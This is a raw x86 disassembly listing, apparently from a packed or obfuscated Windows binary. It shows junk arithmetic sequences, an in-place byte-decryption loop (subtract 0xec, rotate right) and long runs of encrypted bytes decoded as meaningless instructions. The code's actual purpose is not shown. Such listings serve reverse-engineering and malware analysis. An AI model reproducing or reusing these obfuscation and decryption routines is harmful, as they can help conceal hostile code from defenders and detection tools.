  41652c:	pop    edi
  41652d:	inc    edi
  41652e:	push   esp
  41652f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416530:	cmp    BYTE PTR [edx],0x59
  416533:	leave  
  416534:	inc    eax
  416535:	xor    BYTE PTR [edi+0x18414cd1],dh
  41653b:	xchg   esp,eax
  41653c:	loopne 0x416551
  41653e:	jle    0x4164f3
  416540:	and    eax,0x25721687
  416545:	mov    ds:0xeb970d79,eax
  41654a:	cdq    
  41654b:	push   eax
  41654c:	cmp    BYTE PTR [edx],dl
  41654e:	adc    DWORD PTR [ecx+0x4c],ebp
  416551:	adc    ecx,DWORD PTR [eax-0x1e]
  416554:	xor    al,0x14
  416556:	sub    DWORD PTR [ebp+0x7],ecx
  416559:	sti    
  41655a:	mov    al,ds:0x33e8bb71
  41655f:	mov    ecx,0xc80b02e8
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422568
  416605:	mov    edi,0x4224ae
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422568
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x59222a70]
  416729:	stos   BYTE PTR es:[edi],al
  41672a:	ja     0x416728
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx+0x39181814],bl
  416733:	aaa    
  416734:	(bad)  
  416736:	xchg   esp,eax
  416737:	inc    edx
  416738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416739:	mov    esp,0x50c0dc2e
  41673e:	ficomp DWORD PTR [ebp-0x62]
  416741:	inc    ebp
  416742:	and    edx,DWORD PTR [ebx]
  416744:	add    DWORD PTR [ebx],esp
  416746:	mov    cl,0x60
  416748:	mov    al,ds:0x3d860e7d
  41674d:	scas   eax,DWORD PTR es:[edi]
  41674e:	mov    eax,ebp
  416750:	pop    ss
  416751:	ins    BYTE PTR es:[edi],dx
  416752:	popf   
  416753:	mov    eax,0x3ae0c5a0
  416758:	add    ch,BYTE PTR [eax+0x35]
  41675b:	inc    esi
  41675c:	mov    eax,0x902177e6
  416761:	out    dx,eax
  416762:	idiv   BYTE PTR [eax*1-0x219f8b5a]
  416769:	and    eax,0x94e05520
  41676e:	jns    0x4167a7
  416770:	es repnz std 
  416773:	push   ss
  416774:	in     eax,dx
  416775:	sahf   
  416776:	xor    bl,BYTE PTR [edi]
  416778:	ror    BYTE PTR [edx+0x67b0f880],0xb6
  41677f:	sub    ebp,DWORD PTR [esi-0x67b2c29]
  416785:	in     eax,dx
  416786:	fcom   DWORD PTR [eax+eax*8-0x67]
  41678a:	xor    al,0x90
  41678c:	add    ebx,DWORD PTR [ebp+0x4]
  41678f:	mov    bl,0x3
  416791:	jnp    0x41676d
  416793:	mov    esi,DWORD PTR [eax-0x7f7e5049]
  416799:	cli    
  41679a:	loope  0x416747
  41679c:	lea    ebp,[ebp-0x7f]
  41679f:	mov    ebp,0x9fe1670c
  4167a4:	mov    ah,0x16
  4167a6:	xor    eax,0x1d91a7ad
  4167ab:	fwait
  4167ac:	nop
  4167ad:	popa   
  4167ae:	mov    bh,0x7a
  4167b0:	stc    
  4167b1:	call   0x37b2:0x4d53d581
  4167b8:	xchg   ebp,eax
  4167b9:	xchg   edi,eax
  4167ba:	mul    dh
  4167bc:	push   esi
  4167bd:	pop    edi
  4167be:	js     0x416741
  4167c0:	mov    al,0x3a
  4167c2:	cmp    al,0x56
  4167c4:	jg     0x4167e6
  4167c6:	(bad)  
  4167c8:	push   es
  4167c9:	std    
  4167ca:	pop    esp
  4167cb:	xor    BYTE PTR [eax-0x7e],bh
  4167ce:	jns    0x416807
  4167d0:	sti    
  4167d1:	imul   esp,DWORD PTR [eax],0xfffffffd
  4167d4:	inc    eax
  4167d5:	outs   dx,BYTE PTR ds:[esi]
  4167d6:	jmp    0xefe33a71
  4167db:	mov    dh,0x7b
  4167dd:	push   0x65
  4167df:	or     eax,0x49164517
  4167e4:	psubusb mm4,QWORD PTR [ebx]
  4167e7:	shl    BYTE PTR [ecx+ecx*2-0x1f],cl
  4167eb:	js     0x41682f
  4167ed:	sbb    esi,0xd9c3c934
  4167f3:	cmp    eax,0x5043c38a
  4167f8:	xor    eax,0xb5134717
  4167fd:	in     al,dx
  4167fe:	cmp    DWORD PTR [esi+0x15],edi
  416801:	clc    
  416802:	popa   
  416803:	enter  0xa32d,0xe7
  416807:	and    al,0x61
  416809:	(bad)  
  41680b:	push   0xffffff92
  41680d:	fucomi st,st(4)
  41680f:	ja     0x416815
  416811:	cwde   
  416812:	push   0x774c6196
  416817:	ss (bad) 
  416819:	and    ch,bh
  41681b:	cmp    eax,0xd8adce9c
  416820:	and    cl,al
  416822:	(bad)  
  416823:	sbb    BYTE PTR [ebp-0x2c],cl
  416826:	mov    ah,0xe9
  416828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416829:	clc    
  41682a:	mov    bh,0x17
  41682c:	inc    esi
  41682d:	dec    esp
  41682e:	mov    ebx,DWORD PTR [ecx]
  416830:	mov    eax,ds:0x13dff718
  416835:	inc    ecx
  416836:	mov    ebx,0x38ada42f
  41683b:	mov    bl,al
  41683d:	mov    esp,0x574efcc
  416842:	dec    ebp
  416843:	outs   dx,DWORD PTR ds:[esi]
  416844:	test   BYTE PTR [ecx+0x2d11e073],ah
  41684a:	mov    esp,0x886ee559
  41684f:	mov    ds,WORD PTR [ebx]
  416851:	cmp    eax,0x9a172f04
  416856:	jg     0x416826
  416858:	dec    eax
  416859:	sub    ah,ch
  41685b:	mov    ebx,0x4c1bacff
  416860:	xor    edi,DWORD PTR [ebx-0x7b]
  416863:	rol    DWORD PTR [ecx-0x708dbcdd],cl
  416869:	dec    ecx
  41686a:	push   eax
  41686b:	xlat   BYTE PTR ds:[ebx]
  41686c:	add    eax,0x4b
  41686f:	cmp    eax,0x72b30452
  416874:	mov    eax,ds:0xc5c59157
  416879:	inc    ebp
  41687a:	ja     0x416898
  41687c:	or     dh,BYTE PTR [ecx+edi*4+0x671dfc2d]
  416883:	and    eax,0xcfc9f211
  416888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416889:	inc    eax
  41688a:	jmp    0x9565:0x89089551
  416891:	push   0xba70cee9
  416896:	retf   
  416897:	mov    al,ds:0xdfc5e4a9
  41689c:	mov    esi,?
  41689e:	or     edi,DWORD PTR [eax+0x51]
  4168a1:	les    esp,FWORD PTR [esi]
  4168a3:	test   eax,0xaaa61169
  4168a8:	mov    BYTE PTR [esi-0x47],0x2d
  4168ac:	cs je  0x41688d
  4168af:	sbb    BYTE PTR [edi],ch
  4168b1:	push   es
  4168b2:	xchg   DWORD PTR [ebx-0x45c082f7],edx
  4168b8:	jb     0x416907
  4168ba:	mov    al,0xec
  4168bc:	or     eax,0xb63001de
  4168c1:	mov    ebp,0x25bf3d66
  4168c6:	push   0xfffffffe
  4168c8:	scas   al,BYTE PTR es:[edi]
  4168c9:	cmc    
  4168ca:	fbld   TBYTE PTR [eax]
  4168cc:	mov    ds:0x5e471de3,eax
  4168d1:	sbb    BYTE PTR [ebx],ch
  4168d3:	xchg   esp,eax
  4168d4:	ret    
  4168d5:	adc    eax,0x64d81d43
  4168da:	mov    esp,esp
  4168dc:	ficom  WORD PTR [edx-0x77]
  4168df:	fmul   QWORD PTR [ebp+0x5390a9f7]
  4168e5:	fdivp  st(5),st
  4168e7:	xor    esp,DWORD PTR ds:[ebp+eax*8-0x7352620]
  4168ef:	sbb    BYTE PTR [ecx+edi*8-0x738566f7],cl
  4168f6:	xchg   ebx,eax
  4168f7:	push   ebx
  4168f8:	cmp    BYTE PTR [ebp-0x4db88202],al
  4168fe:	dec    edx
  4168ff:	jb     0x4168c8
  416901:	sub    DWORD PTR [edi],esi
  416903:	(bad)  
  416904:	jecxz  0x416955
  416906:	(bad)  
  416907:	mov    ebp,0xe9d74c20
  41690c:	mov    dh,0x9c
  41690e:	mov    dl,0x42
  416910:	xchg   DWORD PTR [esi-0x61e282e],esp
  416916:	cmc    
  416917:	inc    edx
  416918:	jmp    0xca36e995
  41691d:	push   eax
  41691e:	lods   al,BYTE PTR ds:[esi]
  41691f:	jnp    0x416993
  416921:	mov    al,ds:0x192159f
  416926:	sub    ch,ch
  416928:	mov    eax,ds:0x1ae63117
  41692d:	pop    esp
  41692e:	push   cs
  41692f:	lods   al,BYTE PTR ds:[esi]
  416930:	add    DWORD PTR [ecx],0xfb540aed
  416936:	sbb    bl,al
  416938:	and    eax,0xbea9c880
  41693d:	arpl   cx,bx
  41693f:	rcl    DWORD PTR [eax],0x4a
  416942:	xchg   ecx,eax
  416943:	clc    
  416944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416945:	fsub   st,st(4)
  416947:	or     eax,0x93956878
  41694c:	inc    esi
  41694d:	jbe    0x416975
  41694f:	fmul   st(1),st
  416951:	cmp    edi,DWORD PTR [ecx-0x22]
  416954:	test   esi,esi
  416956:	jle    0x41695b
  416958:	adc    eax,0xf0e8d801
  41695d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41695e:	mov    esp,0x1bcc603e
  416963:	cmp    DWORD PTR [esi],ebp
  416965:	lock fistp WORD PTR [ebx+0x5c9119ef]
  41696c:	lods   eax,DWORD PTR ds:[esi]
  41696d:	inc    eax
  41696e:	(bad)  
  41696f:	aad    0xea
  416971:	jno    0x416999
  416973:	inc    eax
  416974:	push   esi
  416975:	lea    eax,[ebp-0x2]
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0x7cc545f0
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx+0x1e181814],bl
  4169ac:	lods   eax,DWORD PTR ds:[esi]
  4169ad:	mov    edx,0x47f0b3e0
  4169b2:	stos   DWORD PTR es:[edi],eax
  4169b3:	pop    eax
  4169b4:	mov    ?,WORD PTR [edi-0x60d035a6]
  4169ba:	xchg   DWORD PTR [ebx-0x70],ebx
  4169bd:	stc    
  4169be:	push   edx
  4169bf:	fild   DWORD PTR [ebp-0x53]
  4169c2:	repnz sahf 
  4169c4:	adc    eax,0xe96c4c8c
  4169c9:	mov    al,0xe1
  4169cb:	and    DWORD PTR [esi+0x65],ebx
  4169ce:	gs pushf 
  4169d0:	adc    ah,BYTE PTR [esi+ebx*8+0x5ce62ecd]
  4169d7:	push   esp
  4169d8:	aad    0x32
  4169da:	dec    eax
  4169db:	rcl    DWORD PTR [eax],cl
  4169dd:	cmp    dh,BYTE PTR [esp+ebp*8+0x6e]
  4169e1:	push   es
  4169e2:	aad    0x8f
  4169e4:	aad    0xd
  4169e6:	mov    fs,edi
  4169e8:	mov    ebx,0xf103942f
  4169ed:	iret   
  4169ee:	sbb    BYTE PTR [ebp+0x22],bl
  4169f1:	dec    eax
  4169f2:	mov    eax,0xa440a191
  4169f7:	(bad)  
  4169f8:	sti    
  4169f9:	mov    eax,0x6f9c22f8
  4169fe:	mov    al,ds:0xcb5e9bb8
  416a03:	pop    esp
  416a04:	(bad)
  416a07:	jnp    0x416a7b
  416a09:	std    
  416a0a:	mov    dl,0xfc
  416a0c:	cwde   
  416a0d:	xor    al,BYTE PTR [ebx-0x34]
  416a10:	push   ebx
  416a11:	jp     0x4169cd
  416a13:	cld    
  416a14:	(bad)  
  416a15:	mov    WORD PTR [ebp+0x67],fs
  416a18:	jmp    0x1b85:0xa64d951e
  416a1f:	and    DWORD PTR [edi+0x71],edi
  416a22:	int3   
  416a23:	les    ebp,FWORD PTR [ebx]
  416a25:	sbb    bl,BYTE PTR [ecx-0x7b]
  416a28:	mov    gs,WORD PTR [esi+0x6692cce7]
  416a2e:	xchg   ebp,eax
  416a2f:	mov    eax,0xa0ec3155
  416a34:	mov    ecx,0x270ff597
  416a39:	ja     0x416a8e
  416a3b:	adc    bh,BYTE PTR [edx]
  416a3d:	fldenv [edx+0x3b78d944]
  416a43:	xor    DWORD PTR [ecx-0x32],0x53
  416a47:	and    DWORD PTR [ecx],esp
  416a49:	cld    
  416a4a:	mov    cl,0x49
  416a4c:	dec    ebx
  416a4d:	cmc    
  416a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a4f:	scas   eax,DWORD PTR es:[edi]
  416a50:	xchg   BYTE PTR [edi-0x2aaf32d8],ah
  416a56:	xchg   ebx,eax
  416a57:	cmp    al,0x6b
  416a59:	sub    dl,al
  416a5b:	mov    DWORD PTR [ebx],0xce2e649c
  416a61:	xor    BYTE PTR fs:[eax-0x4f4483ef],bl
  416a68:	inc    esp
  416a69:	mov    ch,0x82
  416a6b:	ficom  WORD PTR [esi-0x22ce2ad6]
  416a71:	int3   
  416a72:	pop    eax
  416a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a74:	and    eax,0x9b47936e
  416a79:	sbb    al,0x2a
  416a7b:	sahf   
  416a7c:	mov    cs,WORD PTR [eax]
  416a7e:	jns    0x416a58
  416a80:	jecxz  0x416a1f
  416a82:	cli    
  416a83:	(bad)  
  416a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a85:	jnp    0x416a19
  416a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a88:	bound  ebp,QWORD PTR es:[esi]
  416a8b:	pop    es
  416a8c:	sbb    BYTE PTR [ecx-0x7c30e6c0],0x75
  416a93:	mov    esp,0x4b54dc29
  416a98:	and    DWORD PTR [edx+eiz*8+0xa],edx
  416a9c:	retf   0xb8f1
  416a9f:	mov    dh,0xf6
  416aa1:	cmp    DWORD PTR [ebx],ebx
  416aa3:	(bad)
  416aa7:	ror    DWORD PTR [ecx],0x7a
  416aaa:	push   ecx
  416aab:	call   0x6a48f7fa
  416ab0:	sub    esi,eax
  416ab2:	out    dx,eax
  416ab3:	pop    es
  416ab4:	mov    al,0x65
  416ab6:	stos   BYTE PTR es:[edi],al
  416ab7:	lds    ecx,FWORD PTR [edi]
  416ab9:	outs   dx,BYTE PTR ds:[esi]
  416aba:	add    BYTE PTR [edx+0xf],dl
  416abd:	adc    DWORD PTR [edx+edx*8],esi
  416ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ac1:	adc    DWORD PTR [edi+0x30d4ac44],eax
  416ac7:	adc    eax,0x5e32bc8a
  416acc:	jnp    0x416a95
  416ace:	mov    ds:0x87588402,eax
  416ad3:	sar    DWORD PTR [eax+0x734c1ebd],cl
  416ad9:	ins    BYTE PTR es:[edi],dx
  416ada:	fistp  QWORD PTR [ecx+0x26a96d31]
  416ae0:	fucomi st,st(4)
  416ae2:	std    
  416ae3:	jbe    0x416abe
  416ae5:	inc    edx
  416ae6:	(bad)  
  416ae7:	xchg   ebx,eax
  416ae8:	xchg   edx,eax
  416ae9:	add    ch,BYTE PTR [edx+0x74]
  416aec:	daa    
  416aed:	push   0x37f32460
  416af2:	outs   dx,BYTE PTR ds:[esi]
  416af3:	mov    ecx,0xa446479d
  416af8:	sti    
  416af9:	sbb    edi,DWORD PTR [edi]
  416afb:	retf   
  416afc:	lods   eax,DWORD PTR ds:[esi]
  416afd:	nop
  416afe:	js     0x416ac3
  416b00:	sahf   
  416b01:	lods   al,BYTE PTR ds:[esi]
  416b02:	jecxz  0x416a96
  416b04:	hlt    
  416b05:	xchg   ecx,eax
  416b06:	jl     0x416b49
  416b08:	push   esi
  416b09:	jmp    0x3983:0xfe06533a
  416b10:	dec    esi
  416b11:	xchg   ebp,eax
  416b12:	pop    es
  416b13:	dec    eax
  416b14:	push   0xc81b01e8
  416b19:	and    BYTE PTR [edi-0x6a],ah
  416b1c:	push   ebp
  416b1d:	jno    0x416ab3
  416b1f:	and    eax,0xb17b035
  416b24:	cmp    DWORD PTR [ecx],esi
  416b26:	jae    0x416b46
  416b28:	adc    esp,edi
  416b2a:	pop    edi
  416b2b:	cs aad 0x40
  416b2e:	sub    esi,edi
  416b30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b31:	mov    DWORD PTR [edx+0x7d],ecx
  416b34:	mov    DWORD PTR [ebx],0x323fe5df
  416b3a:	fwait
  416b3b:	popa   
  416b3c:	scas   eax,DWORD PTR es:[edi]
  416b3d:	push   esp
  416b3e:	push   ebx
  416b3f:	and    dl,BYTE PTR [ebx+0x39dd6198]
  416b45:	sub    DWORD PTR ss:[ebp-0x6c],edi
  416b49:	mov    ds:0x6e1795d3,eax
  416b4e:	and    eax,0x312f9114
  416b53:	gs mov edx,0x9d24daa4
  416b59:	or     cl,BYTE PTR [esi+0x1f322f67]
  416b5f:	xchg   edx,eax
  416b60:	enter  0x50ff,0xe5
  416b64:	out    0x2b,al
  416b66:	icebp  
  416b67:	scas   al,BYTE PTR es:[edi]
  416b68:	pop    eax
  416b69:	mov    esi,0x7369a48e
  416b6e:	add    cl,BYTE PTR [eax]
  416b70:	add    DWORD PTR [esi-0x29448540],esi
  416b76:	outs   dx,BYTE PTR ds:[esi]
  416b77:	adc    DWORD PTR [edx+0x6],esp
  416b7a:	shl    ebp,1
  416b7c:	xchg   BYTE PTR [eax+0x59bc6c52],bh
  416b82:	sbb    DWORD PTR [edx+0x7e],edi
  416b85:	xchg   DWORD PTR [edi-0x4d],ebx
  416b88:	outs   dx,BYTE PTR ds:[esi]
  416b89:	xor    edi,DWORD PTR [edx+0x22]
  416b8c:	inc    ebp
  416b8d:	fsub   QWORD PTR [eax+0x482020be]
  416b93:	sbb    dl,BYTE PTR [ecx-0x58]
  416b96:	cmp    esi,DWORD PTR [edi+0x55f3ce85]
  416b9c:	xchg   BYTE PTR [edi-0x39],dh
  416b9f:	dec    edx
  416ba0:	aad    0x5a
  416ba2:	sti    
  416ba3:	push   ecx
  416ba4:	pop    edx
  416ba5:	fld    QWORD PTR [edi]
  416ba7:	aad    0xf7
  416ba9:	xchg   ebp,eax
  416baa:	mov    eax,DWORD PTR [edx+ebp*2-0x1c0a29a7]
  416bb1:	call   FWORD PTR [ebx-0x8b7dda0]
  416bb7:	jae    0x416b57
  416bb9:	or     dh,dh
  416bbb:	ja     0x416b74
  416bbd:	in     al,dx
  416bbe:	imul   edi,DWORD PTR [ecx],0x48
  416bc1:	sbb    al,0x1
  416bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bc4:	xchg   ecx,eax
  416bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bc6:	jg     0x416c32
  416bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bc9:	ss jp  0x416bee
  416bcc:	inc    edi
  416bcd:	inc    esp
  416bce:	mov    dh,0x6c
  416bd0:	paddusb mm2,QWORD PTR [edi+0x8e9f22e]
  416bd7:	jns    0x416c35
  416bd9:	jnp    0x416bf3
  416bdb:	push   edx
  416bdc:	xchg   bh,al
  416bde:	push   es
  416bdf:	jbe    0x416c5d
  416be1:	cmp    esi,DWORD PTR [eax+0x46]
  416be4:	inc    ebx
  416be5:	mov    esp,0xb376b1f
  416bea:	js     0x416c18
  416bec:	loope  0x416c3d
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42822f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42835b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42820b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x428283,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x4282e3,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281cb
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42820f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
